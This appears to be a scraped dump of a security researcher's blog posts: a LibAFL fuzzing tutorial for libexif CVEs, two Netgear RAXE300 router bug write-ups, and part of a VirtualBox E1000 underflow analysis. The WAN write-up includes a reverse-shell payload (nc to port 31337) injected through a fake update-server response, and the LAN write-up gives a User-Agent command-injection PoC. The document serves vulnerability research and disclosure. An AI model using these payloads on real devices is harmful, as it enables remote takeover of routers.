(xbuf); exif_data_unref(d); return 0; } #ifdef TRIAGE_TESTER int main(int argc, char* argv[]){ struct stat st; char *filename = argv[1]; stat(filename,\u0026amp;st); FILE *fd = fopen(filename,\u0026#34;rb\u0026#34;); char *buffer = (char*)malloc(sizeof(char)*(st.st_size)); fread(buffer,sizeof(char),st.st_size,fd); LLVMFuzzerTestOneInput(buffer,st.st_size); free(buffer); fclose(fd); } #endif Compiler # Chúng ta cần một file để compile tất cả những gì chúng ta cần chạy fuzz.\nỞ trong file Cargo.toml chúng ta cần chỉnh lại một xíu, thêm vào libafl_cc và libafl_target ở trong dependency.\n[dependencies] libafl = {version = \u0026#34;0.10.1\u0026#34;} libafl_cc = {version = \u0026#34;0.10.1\u0026#34;} libafl_targets = {version = \u0026#34;0.10.1\u0026#34;, features = [ \u0026#34;libfuzzer\u0026#34;, \u0026#34;sancov_pcguard_hitcounts\u0026#34;, \u0026#34;sancov_cmplog\u0026#34;, ]} clap = \u0026#34;3.0.0-beta.5\u0026#34; [lib] name=\u0026#34;exercisetwo\u0026#34; crate-type=[\u0026#34;staticlib\u0026#34;] Tiếp theo đối với excercise-2_compiler.rs. Sau khi lướt một vòng trong repo của LibAFL thì mình nhận ra trong mỗi example của libafl họ đều dùng chung một template cho compiler. Ví dụ như bên dưới\n// build.rs use std::env; fn main() { let out_dir = env::var_os(\u0026#34;OUT_DIR\u0026#34;).unwrap(); let out_dir = out_dir.to_string_lossy().to_string(); println!(\u0026#34;cargo:rerun-if-changed=harness.c\u0026#34;); // Enforce clang for its -fsanitize-coverage support. std::env::set_var(\u0026#34;CC\u0026#34;, \u0026#34;clang\u0026#34;); std::env::set_var(\u0026#34;CXX\u0026#34;, \u0026#34;clang++\u0026#34;); cc::Build::new() // Use sanitizer coverage to track the edges in the PUT .flag(\u0026#34;-fsanitize-coverage=trace-pc-guard,trace-cmp\u0026#34;) // Take advantage of LTO (needs lld-link set in your cargo config) //.flag(\u0026#34;-flto=thin\u0026#34;) .flag(\u0026#34;-Wno-sign-compare\u0026#34;) .file(\u0026#34;./harness.c\u0026#34;) .compile(\u0026#34;harness\u0026#34;); println!(\u0026#34;cargo:rustc-link-search=native={}\u0026#34;, \u0026amp;out_dir); println!(\u0026#34;cargo:rerun-if-changed=build.rs\u0026#34;); } Nên mình chỉ cần sửa đổi lại một xíu để phù hợp cho bài này hehe.\nexercise-2_compiler.rs\nuse libafl_cc::{ClangWrapper, CompilerWrapper}; use std::env; pub fn main() { let cwd = env::current_dir().unwrap(); let args: Vec\u0026lt;String\u0026gt; = env::args().collect(); let mut cc = ClangWrapper::new(); if let Some(code) = cc .cpp(false) .silence(true) .parse_args(\u0026amp;args) .expect(\u0026#34;Failed to parse the command line\u0026#34;) .link_staticlib(\u0026amp;cwd, \u0026#34;exercisetwo\u0026#34;) .add_arg(\u0026#34;-fsanitize-coverage=trace-pc-guard\u0026#34;) .add_arg(\u0026#34;-fsanitize=address\u0026#34;) .run() .expect(\u0026#34;Failed to run the wrapped compiler\u0026#34;) { std::process::exit(code); } } Ở đây mình thêm vào\n-fsanitize-coverage=trace-pc-guard được thêm vào để track edge coverage, nó là SanitizerCoverage -fsanitize=address đơn giản nó là AddressSanitizer để detect các memory errors: Double free, UAF, OOB memory access. Ở trong exercise lần này target của chúng ta đó là cả 2 CVEs đều liên quan tới các lỗi của memory access (arbitrary read \u0026amp; write), tuy nhiên một số memory error sẽ không gây ra crash nhưng chúng vẫn có khả năng tác động nguy hiểm. Những lỗi như thế này thì ASAN sẽ là 1 sự lựa chọn phù hợp.\nỞ trong ngữ cảnh real-world stuff thì việc chạy ASAN sẽ cần tới ít nhất chạy 2 fuzzer, fuzz target với các config khác nhau và fuzz target với ASAN. Việc chạy ASAN sẽ khiến cho performance cost tăng lên, nó sẽ gây chậm quá trình chạy fuzz của chúng ta.\nMakefile.toml # Trước mắt chúng ta cần có 1 file lib.rs để tránh bị lỗi trong quá trình build.\nexercise-2/src/lib.rs\nuse libafl::Error; use libafl_targets::libfuzzer_test_one_input; #[no_mangle] fn libafl_main() -\u0026gt; Result\u0026lt;(), Error\u0026gt; { libfuzzer_test_one_input(\u0026amp;[]); Ok(()) } Mình sẽ chỉnh sửa nốt trong makefile.toml để hoàn thành mọi thứ.\nexercise-2/Makefile.toml\n# tasks [tasks.clean] dependencies = [\u0026#34;cargo-clean\u0026#34;,\u0026#34;build-dir-clean\u0026#34;,\u0026#34;libexif-clean\u0026#34;] [tasks.build] dependencies = [\u0026#34;clean\u0026#34;, \u0026#34;build-compilers\u0026#34;, \u0026#34;copy-project-to-build\u0026#34;, \u0026#34;build-libexif\u0026#34;, \u0026#34;build-fuzzer\u0026#34;] # clean up tasks [tasks.cargo-clean] command = \u0026#34;cargo\u0026#34; args = [\u0026#34;clean\u0026#34;] [tasks.libexif-clean] command = \u0026#34;make\u0026#34; args = [\u0026#34;-C\u0026#34;, \u0026#34;libexif\u0026#34;, \u0026#34;clean\u0026#34;, \u0026#34;-i\u0026#34;] [tasks.build-dir-clean] command = \u0026#34;rm\u0026#34; args = [\u0026#34;-rf\u0026#34;, \u0026#34;build/\u0026#34;] # task build [tasks.build-compilers] command = \u0026#34;cargo\u0026#34; args = [\u0026#34;build\u0026#34;, \u0026#34;--release\u0026#34;] [tasks.copy-project-to-build] script = \u0026#34;\u0026#34;\u0026#34; mkdir -p build/ cp ${CARGO_MAKE_WORKING_DIRECTORY}/../target/release/ex2_compiler build/ cp ${CARGO_MAKE_WORKING_DIRECTORY}/../target/release/libexercisetwo.a build/ \u0026#34;\u0026#34;\u0026#34; [tasks.build-fuzzer] cwd = \u0026#34;build\u0026#34; command = \u0026#34;./ex2_compiler\u0026#34; args = [\u0026#34;-I\u0026#34;, \u0026#34;../libexif/libexif\u0026#34;, \u0026#34;-I\u0026#34;, \u0026#34;../libexif\u0026#34;, \u0026#34;-o\u0026#34;, \u0026#34;fuzzer\u0026#34;, \u0026#34;../harness.c\u0026#34;, \u0026#34;lib/libexif.a\u0026#34;] [tasks.build-triager] cwd = \u0026#34;build\u0026#34; command = \u0026#34;./ex2_compiler\u0026#34; args = [\u0026#34;-D\u0026#34;, \u0026#34;TRIAGE_TESTER\u0026#34;, \u0026#34;-I\u0026#34;, \u0026#34;../libexif/libexif\u0026#34;, \u0026#34;-I\u0026#34;, \u0026#34;../libexif\u0026#34;, \u0026#34;-o\u0026#34;, \u0026#34;triager\u0026#34;, \u0026#34;../harness.c\u0026#34;, \u0026#34;lib/libexif.a\u0026#34;] [tasks.build-libexif] cwd = \u0026#34;libexif\u0026#34; env = { \u0026#34;CC\u0026#34; = \u0026#34;${CARGO_MAKE_WORKING_DIRECTORY}/build/ex2_compiler\u0026#34;, \u0026#34;LLVM_CONFIG\u0026#34; = \u0026#34;llvm-config-15\u0026#34;} script = \u0026#34;\u0026#34;\u0026#34; autoreconf -fi ./configure --enable-shared=no --prefix=\u0026#34;${CARGO_MAKE_WORKING_DIRECTORY}/../build/\u0026#34; make -i make install -i \u0026#34;\u0026#34;\u0026#34; Sau đó mình sẽ chạy cargo make build và kết quả sau khi chạy đó là file fuzzer trong exercise-2/build\nWriting Fuzzer # Giống như exercise 1, mình sẽ sử dụng các component tương tự với bài trước nhưng sẽ phải có chỉnh sửa một xíu chứ không thể bên nguyên xi được.\n1st Component: Corpus \u0026amp; Input # Về phần này thì không có gì khác biệt với bài trước, mình vẫn sử dụng\nOnDiskCorpus InMemoryCorpus BytesInput Nếu như bạn chưa biết 3 cái trên là cái gì thì mình recommend xem lại bài post này 1st Component: Corpus \u0026amp; Input, mình đã giải thích khá kỹ về 3 cái trên.\n// path to input corpus let corpus_dirs = vec![PathBuf::from(\u0026#34;./corpus\u0026#34;)]; // Corpus that will be evolved, we keep it in memory for performance let input_corpus = InMemoryCorpus::\u0026lt;BytesInput\u0026gt;::new(); // Corpus in which we store solutions on disk so the user can get them after stopping the fuzzer let solutions_corpus = OnDiskCorpus::new(PathBuf::from(\u0026#34;./solutions\u0026#34;)).unwrap(); 2nd Component: Observer # Mình cũng sẽ tái sử dụng lại các component của bài trước vì nó không có gì cần phải chỉnh sửa hoặc thay đổi.\nStdMapObserver: Vì lần này mình sẽ sử dụng InMemoryExecutor(mình sẽ nói ở bên dưới) nên việc sử dụng StdMapObserver là cần thiết cho việc lấy lại trạng thái của coverage map. Chúng ta không thể sử dụng ConstMapObserver vì Max Edges Map không thể xác định được trong quá trình compile. HitcountsMapObserver để tăng thêm edge coverage đạt được từ StdMapObserver. Để xác định đoạn mã nào có lỗi trong flow của mình. TimeObserver, cung cấp thông tin về thời gian trong quá trình chạy fuzz của testcase hiện tại, hỗ trợ cho các component tiếp theo. Xem lại bài trước của mình 2nd Component: Observer để hiểu rõ hơn về HitcountsMapObserver và TimeObserver.\nlet edges_observer = HitcountsMapObserver::new(unsafe { std_edges_map_observer(\u0026#34;edges\u0026#34;) }); // Create an observation channel to keep track of the execution time and previous runtime let time_observer = TimeObserver::new(\u0026#34;time\u0026#34;); 3rd Component: Feedback # MaxMapFeedback xác định xem liệu coverage map hiện tại có lớn hơn so với coverage map mà chúng ta đưa vào từ đầu rồi từ đó xác định test case hiện tại có phù hợp để đưa vào input tiếp theo hay không. TimeFeedback theo dõi thời gian của quá trình thực thi test case hiện tại, và xác định xem thời gian hiện tại có \u0026ldquo;interesting\u0026rdquo; hay không để đưa test case hiện tại làm input tiếp theo. Mình nói rõ hơn trong bài trước 3nd Component: Feedback\nlet mut feedback = feedback_or!( // New maximization map feedback (attempts to maximize the map contents) linked to the // edges observer and the feedback state. This one will track indexes, but will not track // novelties, i.e. tracking(... true, false). MaxMapFeedback::tracking(\u0026amp;edges_observer, true, false), // Time feedback, this one does not need a feedback state, nor does it ever return true for // is_interesting, However, it does keep track of testcase execution time by way of its // TimeObserver TimeFeedback::with_observer(\u0026amp;time_observer) ); let mut objective = feedback_and_fast!(CrashFeedback::new(), MaxMapFeedback::new(\u0026amp;edges_observer)); Việc mình sử dụng CrashFeedback ở đây đó là fuzzer sẽ xác định nếu input của test case hiện tại gây crash thì nó sẽ là \u0026ldquo;interesting\u0026rdquo; input và sẽ được đưa vào làm corpus cho input tiếp theo sau khi đã mutated.\n4th Component: State # StdState nó sẽ lấy trạng thái hiện tại của fuzzer và nó là cái mà mình thấy sử dụng được trong bài lần này. let mut state = state.unwrap_or_else(|| { StdState::new( // random number generator with a time-based seed StdRand::with_seed(current_nanos()), input_corpus, solutions_corpus, // States of the feedbacks that store the data related to the feedbacks that should be // persisted in the State. \u0026amp;mut feedback, \u0026amp;mut objective, ) .unwrap() }); 5th Component: Monitor # Tương tự với post trước, mình sẽ sử dụng SimpleMonitor và component này chỉ in ra terminal các thông tin cần thiết cho chúng ta.\nlet monitor = MultiMonitor::new(|s| { println!(\u0026#34;{}\u0026#34;, s); }); 6th Component: EventManager # Bài lần trước mình đã sử dụng SimpleEventManager nhưng lần này mình sẽ sử dụng LlmpRestartingEventManager để tăng performance cho fuzzer. Nó hoạt động dựa trên SimpleEventManager nhưng với mỗi child process bị crash LlmpRestartingEventManager sẽ fork ra một process mới để tiếp tục quá trình fuzzing\nlet (state, mut mgr) = match setup_restarting_mgr_std(monitor, 1337, EventConfig::AlwaysUnique) { Ok(res) =\u0026gt; res, Err(err) =\u0026gt; match err { Error::ShuttingDown =\u0026gt; { return Ok(()); } _ =\u0026gt; { panic!(\u0026#34;Failed to setup the restarting manager: {}\u0026#34;, err); } }, }; 7th Component: Scheduler # Về Scheduler mình sẽ sử dụng lại các component của bài trước\nQueueScheduler sử dụng để sắp xếp các corpus theo 1 thứ tự nhất định IndexesLenTimeMinimizerScheduler sẽ ưu tiên các test case gọn và nhanh ở trong corpus input let scheduler = IndexesLenTimeMinimizerScheduler::new(QueueScheduler::new()); 8th Component: Fuzzer # StdFuzzer sẽ kết hợp các component với nhau và chạy chúng. Để hiểu rõ hơn thì hãy đọc lại bài post trước của mình 8th Component: Fuzzer\n// A fuzzer with feedback, objectives, and a corpus scheduler let mut fuzzer = StdFuzzer::new(scheduler, feedback, objective); 9th Component: Harness # Về exercise lần này mình sẽ thêm vào component harness, nó sẽ có tác dụng đưa vào các bytes đã được mutate bởi fuzzer và đưa chúng vào trong hàm LLVMFuzzerTestOneInput trong file harness.c\n// // Component: harness // let mut harness = |input: \u0026amp;BytesInput| { let target = input.target_bytes(); let buffer = target.as_slice(); libfuzzer_test_one_input(buffer); ExitKind::Ok }; 10th Component: Executor # Component này mình thêm vào với hàm tương ứng là\nInProcessExecutor sẽ thay thế ForkserverExecutor là bởi vì chúng ta chạy fuzz dưới dạng một file binary được chạy độc lập, việc này sẽ làm tăng tốc độ quá trình fuzzing. TimeoutExecutor set timeout trước khi mỗi lần chạy file target tránh việc các test case gây chậm quá trình fuzzing, ngoài ra nó còn kết hợp với các component khác để xác định các test case gây time out. let in_proc_executor = InProcessExecutor::new( \u0026amp;mut harness, tuple_list!(edges_observer, time_observer), \u0026amp;mut fuzzer, \u0026amp;mut state, \u0026amp;mut mgr, ) .unwrap(); let timeout = Duration::from_millis(5000); // wrap in process executor with a timeout let mut executor = TimeoutExecutor::new(in_proc_executor, timeout); 11th Component: Mutator \u0026amp; Stage # StdScheduledMutator StdMutationalStage // // Component: Mutator // // Setup a mutational stage with a basic bytes mutator let mutator = StdScheduledMutator::new(havoc_mutations()); // // Component: Stage // let mut stages = tuple_list!(StdMutationalStage::new(mutator)); Combine Everythin and Running the fuzzer # fuzzer .fuzz_loop_for(\u0026amp;mut stages, \u0026amp;mut executor, \u0026amp;mut state, \u0026amp;mut mgr, 1000) .unwrap(); Fuzz\u0026rsquo;em All # Setup # Sau khi mọi thứ đã hoàn tất và việc bây giờ của chúng ta đó là build và chạy fuzz\nSau khi build xong thì kết quả là chúng ta sẽ có 1 folder build như bên dưới\nVà việc bây giờ của chúng ta đó là setup ASAN và chạy fuzz.\nNhư mình đã nói ở trên thì để đạt được target mà chúng ta cần đó là memory error thì chúng ta cần phải có ASAN, tuy nhiên ở chế độ mặc định thì ASAN sẽ tự động exit sau mỗi lần dính crash, nhưng target của chúng ta cần đó là 2 bug, OOB read and write, và việc exit của ASAN sẽ khiến cho quá trình fuzzing của chúng ta bị chững lại và khiến cho chúng ta phải chạy lại từ đầu. Thế nên command line bên dưới sẽ set flag cho ASAN không exit khi mỗi lần gặp crash.\nASAN_OPTIONS=abort_on_error=1\nChạy fuzzing # Để chạy fuzzer chúng ta cần 2 terminal, 1 cái để fuzz target với config mà chúng ta đã xác định từ trước và 1 cái để fuzz target với ASAN\nTerminal 1 running fuzzer with ASAN\nTerminal 2 running fuzzer target\nResult # Và sau khi chạy 1 lúc thì chúng ta đã có kết quả\nVí dụ về report của ASAN\nCòn 1 đoạn về triage nữa nhưng mình khá lười để viết, nôm na nó dùng để xác định xem các solution của chúng ta có unique bug nào hay không, nhưng bài tới đây cũng khá dài rồi, hẹn các bạn vào 1 bài khác mình sẽ làm rõ về phần này (hoặc không \u0026hellip;.)\nvia GIPHY\n","date":"27 November 2023","externalUrl":null,"permalink":"/posts/fuzzing_holy_bible_chapter2/","section":"Posts","summary":"Using LibAFL fuzzer to reproduce CVE-2009-3895 \u0026amp; CVE-2012-2836","title":"LibAFL Fuzzing Holy Bible - Chapter II: Fuzzing Libexif - CVE-2009-3895 \u0026 CVE-2012-2836","type":"posts"},{"content":"","date":"25 April 2023","externalUrl":null,"permalink":"/tags/netgear/","section":"Tags","summary":"","title":"Netgear","type":"tags"},{"content":" background # Nighthawk RAXE300 router has a binary file call pucfu, lies in /bin/pucfu. This file main function is checking the firmware update. This file is executed while the router is booted and it will attempt to connect https://devcom.up.netgear.com/, and sending a https request to it.\nanalyze and root cause of vulnerability # It sending a request to https://devcom.up.netgear.com/ by curl_post (usr/lib/libfwcheck.so) function, and it is quite interested in this below snippet.\nsize_t __fastcall curl_post(const char *url, const char *post_data, void **a3) { /// fw_debug(1, \u0026#34; URL is %s\\n\u0026#34;, url); curl_easy_setopt(curl, 10002, url); curl_easy_setopt(curl, 10023, http_content_header); curl_easy_setopt(curl, 10015, post_data); curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0); //1 curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0); //2 curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, 1); data_size = strlen(post_data); curl_easy_setopt(curl, CURLOPT_INFILESIZE_LARGE, data_size); curl_easy_setopt(curl, 20011, sub_68CC); curl_easy_setopt(curl, 10001, s); } The first vulnerable lies in the line of comment [1] and [2].\ncurl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0); //1, this function setting CURLOPT_SSL_VERIFYHOST to 0, which mean, it\u0026rsquo;s disable hostname verification and cURL will not verify the server\u0026rsquo;s hostname. curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0); //2, similar to the above function, this line of code, it\u0026rsquo;s disable the verification of SSL/TLS certificate, which mean it won\u0026rsquo;t check the validity of the server\u0026rsquo;s SSL/TLS certification.\nCombine the two line of flaw code above, hacker can abuse it to perform man-in-the-middle attack, which mean they can fake the DHCP or DNS update server.\nNormal respone from the server:\n{ \u0026#34;status\u0026#34;: 1, \u0026#34;errorCode\u0026#34;: null, \u0026#34;message\u0026#34;: null, \u0026#34;url\u0026#34;: \u0026#34;https://test\u0026#34; } The second vulnerability lies in pufwUpgrade, this file is executed at the same time with pucfu file, it\u0026rsquo;s check the firmware upgrade and the url to check for upgrade is from /tmp/fw/cfu_url_cache (which store before in pucfu file). After it reads the url for update, the FwGetUpdate function at address 0x000126F8 in pufwUpgrade binary file, the FwGetUpdate function push the url to the DownloadFiles function as the first argument.\nint FwGetUpdate(int a1) { // while ( 1 ) { SetFileValue(\u0026#34;/data/fwLastChecked\u0026#34;, \u0026#34;lastDL_sku\u0026#34;, v69); SetFileValue(\u0026#34;/data/fwLastChecked\u0026#34;, \u0026#34;lastDL_url\u0026#34;, \u0026amp;byte_2717C); v4 = DownloadFiles(firmware_url_update, \u0026#34;/tmp/fw/dl_fileinfo_unicode\u0026#34;, \u0026#34;/tmp/fw/dl_result\u0026#34;, 0); /// } } In the DownloadFiles (at address 0x00002DE0 in file libpu_util.so) function, the url is stored as a string for the command line.\nint DownloadFiles(const char *url_update, const char *a2, char *filename, int a4) { if (is_http) { // }else { snprintf( s, 0x1F4u, \u0026#34;(curl --fail --insecure %s --max-time %d --speed-time 15 --speed-limit 1000 -o %s 2\u0026gt; %s; echo $? \u0026gt; %s)\u0026#34;, url_update, v7, a2, \u0026#34;/tmp/curl_result_err.txt\u0026#34;, \u0026#34;/tmp/curl_result.txt\u0026#34;); j_DBG_PRINT(\u0026#34;%s:%d, cmd=%s\\n\u0026#34;, \u0026#34;DownloadFiles\u0026#34;, 328, s); v15 = j_pegaPopen((int)s, (int)\u0026#34;r\u0026#34;); // } } The command line (which has url inside) is push into j_pegaPopen function as the first argument, after that in pegaPopen function (at address 0x00001D74 in libpu_util.so file), it\u0026rsquo;s execute the command line as the first argument with /bin/sh.\nCombine the two bug above, attacker can fake the https update server and do command injection in the url easily.\nCommand Injection In Respone Data # { \u0026#34;status\u0026#34;: 1, \u0026#34;errorCode\u0026#34;: null, \u0026#34;message\u0026#34;: null, \u0026#34;url\u0026#34;: \u0026#34;\u0026#39;; rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2\u0026gt; 1|nc 192.168.0.1 31337 \u0026gt;/tmp/f #\u0026#34; } The above snippet injects the reverse shell command rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2\u0026gt; 1|nc 192.168.0.1 31337 \u0026gt;/tmp/f (https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) into the url parameter, which mean it will sending a root shell to IP 192.168.0.1 port 31337.\n","date":"25 April 2023","externalUrl":null,"permalink":"/posts/wan_bug_raxe300/","section":"Posts","summary":"Second bug I found in RAXE300 Netgear device. A WAN bug lead to RCE","title":"WAN bug in RAXE300","type":"posts"},{"content":" background # After studied about security and played CTF for a year, I decide to move on to the real world playground, and I choose Nighthawk RAXE300 as a target. Below is how I found the command injection bug in Nighthawk RAXE300.\nAfter studying of hacking router devices, I realized that common LAN bug come from many of services such as: hostapd, httpd, smb,\u0026hellip; So when started to analyze the RAXE300 firmware, I\u0026rsquo;m try to reverse some files like: pudil, pucfu, dhcpc, puhttpsniff, they took me a lot of time and efford for reversing. When I stop at puhttpsniff, It\u0026rsquo;s quite an interested file and code base of it quite small, so I decide to dig deep into puhttpsniff.\nLAN bug in RAXE300 firmware # I discovered one of the many vulnerabilities of RAXE300 was the command injection in \u0026ndash;user-agent field of the device. The bug lie in the function at address 0x10EC0 of puhttpsniff binary file, you can see in the below snippet:\nchar *__fastcall sub_10EC0(const char *a1, int a2, _WORD *a3, int a4) { ... result = strstr(a1, \u0026#34;User-Agent: \u0026#34;); if ( result ) { _isoc99_sscanf(result + 12, \u0026#34;%255[^\\r\\n]\u0026#34;, v17); .... sprintf((char *)v18, \u0026#34;pudil -i %s \\\u0026#34;%s\\\u0026#34;\u0026#34;, v12, (const char *)v17); result = (char *)system((const char *)v18); ... } ... } In summary, the above function, it takes contents from User-Agent field and pass it into the second argument of pudil command and run it with system command.\nAs you can see the above code. First it find does User-Agent exist in a1 variable by result = strstr(a1, \u0026quot;User-Agent: \u0026quot;); , after that it reads input with _isoc99_sscanf(result + 12, \u0026quot;%255[^\\r\\n]\u0026quot;, v17); and store it in v17 variable. Next it pass v17 as the second argument into pudil command and store the string in v18 variable, sprintf((char *)v18, \u0026quot;pudil -i %s \\\u0026quot;%s\\\u0026quot;\u0026quot;, v12, (const char *)v17);. After that it run the command by system function with v18 is the first argument.\nBecause it doesn\u0026rsquo;t check some special character, so we can easy to exploit the command injection bug with ` character.\nPoC: curl --user-agent \u0026quot;a`ls`\u0026quot; 192.168.0.1\n","date":"21 April 2023","externalUrl":null,"permalink":"/posts/my_very_first_bug/","section":"Posts","summary":"My first bug I found in Real World stuff. A LAN bug in RAXE300 Netgear device","title":"My very first bug","type":"posts"},{"content":"","date":"28 November 2022","externalUrl":null,"permalink":"/tags/virtualbox/","section":"Tags","summary":"","title":"Virtualbox","type":"tags"},{"content":" mảng Tx(transmit) descriptor sẽ trông như thế này [context_1, data_2, data_3, context_4, data_5]\ncontext_1.header_length = 0 context_1.maximum_segment_size = 0x3010 context_1.tcp_segmentation_enabled = true data_2.data_length = 0x10 data_2.end_of_packet = false data_2.tcp_segmentation_enabled = true data_3.data_length = 0 data_3.end_of_packet = true data_3.tcp_segmentation_enabled = true context_4.header_length = 0 context_4.maximum_segment_size = 0xF context_4.tcp_segmentation_enabled = true data_5.data_length = 0x4188 data_5.end_of_packet = true data_5.tcp_segmentation_enabled = true Phân tích nguyên nhân cốt lỗi gây ra bug # Các hàm quan trọng cần phải nắm\ne1kXmitPending() (src/VBox/Devices/Network/DevE1000.cpp) static int e1kXmitPending(PE1KSTATE pThis, bool fOnWorkerThread) { ... while (!pThis-\u0026gt;fLocked \u0026amp;\u0026amp; e1kTxDLazyLoad(pThis)) { while (e1kLocateTxPacket(pThis)) { fIncomplete = false; /* Found a complete packet, allocate it. */ rc = e1kXmitAllocBuf(pThis, pThis-\u0026gt;fGSO); /* If we\u0026#39;re out of bandwidth we\u0026#39;ll come back later. */ if (RT_FAILURE(rc)) goto out; /* Copy the packet to allocated buffer and send it. */ rc = e1kXmitPacket(pThis, fOnWorkerThread); /* If we\u0026#39;re out of bandwidth we\u0026#39;ll come back later. */ if (RT_FAILURE(rc)) goto out; } } ... } DECLINLINE(bool) e1kTxDLazyLoad(PE1KSTATE pThis) { if (pThis-\u0026gt;nTxDFetched == 0) return e1kTxDLoadMore(pThis) != 0; return true; } Giả sử các descriptor ở trên được ghi vào Tx Ring(là nguồn từ phần cứng thông qua hệ thống cái mà được nhận vào và gửi các gói tin tới mạng). Hàm e1kTxDLazyLoad() sẽ được thực thi, lúc này nó sẽ đọc 5 descriptor từ Tx Ring. Tại lần đầu tiên gọi tới hàm e1kLocateTxPacket(), thì hàm này sẽ đi qua 1 lượt các descriptor được khởi tạo nhưng nó không handle chúng, ở lần đầu tiên thì nó chỉ đọc 3 descriptor đầu ([context_1, data_2, data_3]) và vòng lặp thứ 2 nó sẽ đọc 2 descriptor còn lại ([context_4, data_5]).\ne1kLocateTxPacket() static bool e1kLocateTxPacket(PE1KSTATE pThis) { ... for (int i = pThis-\u0026gt;iTxDCurrent; i \u0026lt; pThis-\u0026gt;nTxDFetched; ++i) { E1KTXDESC *pDesc = \u0026amp;pThis-\u0026gt;aTxDescriptors[i]; switch (e1kGetDescType(pDesc)) { case E1K_DTYP_CONTEXT: e1kUpdateTxContext(pThis, pDesc); continue; case E1K_DTYP_LEGACY: /* Skip empty descriptors. */ if (!pDesc-\u0026gt;legacy.u64BufAddr || !pDesc-\u0026gt;legacy.cmd.u16Length) break; cbPacket += pDesc-\u0026gt;legacy.cmd.u16Length; pThis-\u0026gt;fGSO = false; break; case E1K_DTYP_DATA: /* Skip empty descriptors. */ ... } } } Descriptor đầu tiên ([context_1]) nó sẽ là case E1K_DTYP_CONTEXT thì hàm e1kUpdateTxContext() sẽ được gọi và cập nhật TCP Segmentation Context nếu như TCP Segmentation được bật cho descriptor đó.\nDescriptor thứ hai ([data_2]) là case E1K_DTYP_DATA(), nó không quan trọng trong bài viết này nên ko cần nhắc tới.\nDescriptor thứ 3 ([data_3]) cũng là case E1K_DTYP_DATA(), nhưng mà do data_3.data_length = 0 vì thế nên sẽ không có chuyện gì xảy ra\nSau khi thực hiện xong hàm switch case thì sẽ có một hàm check liệu thuộc tính end_of_packet của descriptor đó có true hay không. Tại vì data_3.end_of_packet = true vậy nên sẽ thực thi câu lệnh bên trong hàm if và return về true.\nif (pDesc-\u0026gt;legacy.cmd.fEOP) { ... return true; } Nếu như data_3.end_of_packet được set thành false thì 2 descriptor còn lại [context_4, data_5] sẽ được xử lý và lỗ hổng sẽ được bypassed.\nBên trong vòng lặp while true của hàm e1kXmitPending() có gọi đến hàm e1kXmitPacket(), ở hàm này nó sẽ xử lý toàn bộ descriptor của chúng ta (ở đây là 5)\nwhile (pThis-\u0026gt;iTxDCurrent \u0026lt; pThis-\u0026gt;nTxDFetched) { E1KTXDESC *pDesc = \u0026amp;pThis-\u0026gt;aTxDescriptors[pThis-\u0026gt;iTxDCurrent]; ... rc = e1kXmitDesc(pThis, pDesc, e1kDescAddr(TDBAH, TDBAL, TDH), fOnWorkerThread); ... if (e1kGetDescType(pDesc) != E1K_DTYP_CONTEXT \u0026amp;\u0026amp; pDesc-\u0026gt;legacy.cmd.fEOP) break; } Ứng với mỗi descriptor thì hàm e1kXmitDesc() sẽ được gọi để xử lý nó\nstatic int e1kXmitDesc(PE1KSTATE pThis, E1KTXDESC *pDesc, RTGCPHYS addr, bool fOnWorkerThread) { ... switch (e1kGetDescType(pDesc)) { case E1K_DTYP_CONTEXT: ... break; case E1K_DTYP_DATA: { ... if (pDesc-\u0026gt;data.cmd.u20DTALEN == 0 || pDesc-\u0026gt;data.u64BufAddr == 0) { E1kLog2((\u0026#34;% Empty data descriptor, skipped.\\n\u0026#34;, pThis-\u0026gt;szPrf)); } else { if (e1kXmitIsGsoBuf(pThis-\u0026gt;CTX_SUFF(pTxSg))) { ... } else if (!pDesc-\u0026gt;data.cmd.fTSE) { ... } else { STAM_COUNTER_INC(\u0026amp;pThis-\u0026gt;StatTxPathFallback); rc = e1kFallbackAddToFrame(pThis, pDesc, fOnWorkerThread); } } ... } } } Lần lượt các descriptor được đưa vào để xử lý và thực thi các hàm bên trong case tương ứng của nó\nVới descriptor đầu tiên là context_1 thì nó sẽ không làm gì hết\nTại vì tcp_segmentation_enable == true với tất cả các data transcriptor thì câu lệnh bên trong hàm else của câu lệnh if (e1kXmitIsGsoBuf(pThis-\u0026gt;CTX_SUFF(pTxSg))) được gọi tức là hàm e1kFallbackAddToFrame() sẽ được thực thi, tuy nhiên ở bên trong hàm e1kFallbackAddToFrame() có bug interger underflow lúc mà data_5 được xử lý.\nstatic int e1kFallbackAddToFrame(PE1KSTATE pThis, E1KTXDESC *pDesc, bool fOnWorkerThread) { ... uint16_t u16MaxPktLen = pThis-\u0026gt;contextTSE.dw3.u8HDRLEN + pThis-\u0026gt;contextTSE.dw3.u16MSS; /* * Carve out segments. */ int rc = VINF_SUCCESS; do { /* Calculate how many bytes we have left in this TCP segment */ uint32_t cb = u16MaxPktLen - pThis-\u0026gt;u16TxPktLen; if (cb \u0026gt; pDesc-\u0026gt;data.cmd.u20DTALEN) { /* This descriptor fits completely into current segment */ cb = pDesc-\u0026gt;data.cmd.u20DTALEN; rc = e1kFallbackAddSegment(pThis, pDesc-\u0026gt;data.u64BufAddr, cb, pDesc-\u0026gt;data.cmd.fEOP /*fSend*/, fOnWorkerThread); } else { ... } pDesc-\u0026gt;data.u64BufAddr += cb; pDesc-\u0026gt;data.cmd.u20DTALEN -= cb; } while (pDesc-\u0026gt;data.cmd.u20DTALEN \u0026gt; 0 \u0026amp;\u0026amp; RT_SUCCESS(rc)); if (pDesc-\u0026gt;data.cmd.fEOP) { ... pThis-\u0026gt;u16TxPktLen = 0; ... } return VINF_SUCCESS; /// @todo consider rc; } Ở hàm trên có biến uint16_t u16MaxPktLen, pThis-\u0026gt;u16TxPktLen và pDesc-\u0026gt;data.cmd.u20DTALEN là đáng để chú ý đến.\nif (e1kGetDescType(pDesc) != E1K_DTYP_CONTEXT \u0026amp;\u0026amp; pDesc-\u0026gt;legacy.cmd.fEOP) break; Ở bên trong hàm e1kXmitPacket() nó có đề cập đến nếu như descriptor đang được xử lý là data và end_of_packet == true thì nó sẽ thoát 